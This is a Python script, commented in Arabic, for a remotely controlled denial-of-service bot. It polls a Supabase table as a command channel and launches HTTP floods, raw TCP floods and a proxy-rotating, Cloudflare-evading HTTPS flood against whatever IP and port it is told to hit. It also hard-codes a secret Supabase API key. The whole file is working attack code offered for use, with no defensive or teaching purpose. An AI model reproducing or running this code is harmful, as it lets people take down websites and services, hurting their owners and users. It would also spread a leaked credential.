import socket
import os
import random
from threading import Thread
import multiprocessing
import time
import sys

# تثبيت المكتبات اللازمة تلقائياً
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests

try:
    import cloudscraper
except:
    os.system("pip3 install cloudscraper")
    import cloudscraper

# --- إعدادات Supabase ---
SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

# --- جلب البروكسيات من الرابط المطلوب ---
def fetch_proxies():
    print("[*] Fetching Elite HTTPS Proxies...")
    proxy_url = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"
    try:
        response = requests.get(proxy_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            proxies = []
            for p in data.get('data', []):
                # نختار فقط البروكسيات التي تدعم HTTPS لضمان عمل الميثود
                protocol = "https" if "https" in p['protocols'] else "http"
                proxy_str = f"{protocol}://{p['ip']}:{p['port']}"
                proxies.append(proxy_str)
            print(f"[+] Loaded {len(proxies)} proxies successfully.")
            return proxies
    except Exception as e:
        print(f"[-] Error fetching proxies: {e}")
    return []

def MyUser_Agent():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    ]

# --- ميثود BYPASS-HTTPS المعدل بالبروكسي ---
def launch_bypass_https(url, duration, threads=300):
    end_time = time.time() + duration
    proxy_list = fetch_proxies()
    
    def attack_thread():
        while time.time() < end_time:
            # استخدام بروكسي عشوائي لكل محاولة
            current_proxy = random.choice(proxy_list) if proxy_list else None
            proxies = {"http": current_proxy, "https": current_proxy} if current_proxy else None
            
            scraper = cloudscraper.create_scraper()
            try:
                # إرسال طلب باستخدام البروكسي وبصمة متصفح مخفية
                scraper.get(url, proxies=proxies, timeout=5, headers={'User-Agent': random.choice(MyUser_Agent())})
            except:
                pass # في حال تعطل البروكسي ننتقل للطلب التالي

    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    
    time.sleep(duration)

def tcp_attack(ip, port, duration, threads=200, packet_size=1024):
    end_time = time.time() + duration
    def attack_thread():
        while time.time() < end_time:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(2)
                    sock.connect((ip, port))
                    while time.time() < end_time:
                        sock.send(random._urandom(packet_size))
            except:
                pass
    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    time.sleep(duration)

def moonHttp(host_http, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
                mysocket.connect((host_http, port))
                while time.time() < end_time:
                    msg = f'GET / HTTP/1.1\r\nHost: {host_http}\r\nUser-Agent: {random.choice(MyUser_Agent())}\r\nConnection: keep-alive\r\n\r\n'
                    mysocket.send(msg.encode())
        except:
            pass

def execute_attack(method, ip, port, duration):
    method_upper = method.upper()
    print(f"[*] Started Task: {method_upper} on {ip} for {duration}s")
    
    if method_upper == "HTTP":
        threads_list = []
        for _ in range(200):
            thd = Thread(target=moonHttp, args=(ip, port, duration), daemon=True)
            thd.start()
        time.sleep(duration)
    
    elif method_upper == "TCP":
        tcp_attack(ip, port, duration)
    
    elif method_upper == "BYPASS-HTTPS":
        # ملاحظة: في BYPASS-HTTPS يتم تمرير الرابط (IP) كاملاً
        launch_bypass_https(ip, duration)
    
    print(f"[!] Task Finished: {method_upper}")

def check_new_requests():
    print("System Running... Listening for new requests.")
    last_id = 0
    
    # الحصول على آخر ID مسجل لبدء المراقبة من بعده
    try:
        response = requests.get(f"{SUPABASE_URL}?select=id&order=id.desc&limit=1", headers=HEADERS)
        if response.status_code == 200 and response.json():
            last_id = response.json()[0]['id']
    except:
        pass

    while True:
        try:
            response = requests.get(f"{SUPABASE_URL}?select=id,method,ip,port,Time&order=id.desc&limit=1", headers=HEADERS)
            if response.status_code == 200:
                data = response.json()
                if data and data[0]['id'] > last_id:
                    req = data[0]
                    last_id = req['id']
                    
                    p = multiprocessing.Process(
                        target=execute_attack, 
                        args=(req['method'], req['ip'], int(req['port']), int(req.get('Time', 60)))
                    )
                    p.start()
                    print(f"[+] New Attack Process! ID: {last_id} | Method: {req['method']}")
        except Exception as e:
            print(f"Error checking Supabase: {e}")
        
        time.sleep(2)

if __name__ == "__main__":
    check_new_requests()
